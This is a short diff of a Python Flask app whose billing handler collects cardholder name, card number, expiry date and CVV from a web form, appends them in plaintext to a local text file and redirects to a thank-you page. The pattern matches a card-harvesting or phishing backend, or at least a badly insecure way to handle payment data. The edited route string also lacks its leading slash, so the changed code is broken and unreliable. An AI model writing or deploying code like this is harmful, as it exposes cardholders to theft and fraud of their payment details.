@@ -12,25 +12,20 @@ def index():
 # Define the path to save the billing data
 SAVE_PATH = 'billing_data.txt'
 
-@app.route('/billing', methods=['POST'])
-def billing():
-    # Get the form data
+@app.route('billing', methods=['POST'])
+def process_billing():
+    # Handle the form submission (saving data, etc.)
     cardholder = request.form.get('cardholder')
     cardNum = request.form.get('cardNum')
     cardexpiry = request.form.get('cardexpiry')
     cvv = request.form.get('cvv')
 
-    # Prepare the data to write to the file
-    billing_data = f"Cardholder: {cardholder}\n"
-    billing_data += f"Card Number: {cardNum}\n"
-    billing_data += f"Card Expiry: {cardexpiry}\n"
-    billing_data += f"CVV: {cvv}\n\n"
-
-    # Write the data to the file (appending each time)
-    with open(SAVE_PATH, 'a') as file:
+    # Example: Saving data to a file
+    billing_data = f"Cardholder: {cardholder}\nCard Number: {cardNum}\nCard Expiry: {cardexpiry}\nCVV: {cvv}\n\n"
+    with open('billing_data.txt', 'a') as file:
         file.write(billing_data)
 
-    # Redirect to the thank you page
+    # Redirect to 'alhamdulillah' page
     return redirect(url_for('alhamduliah'))
 
 @app.route('/alhamduliah')
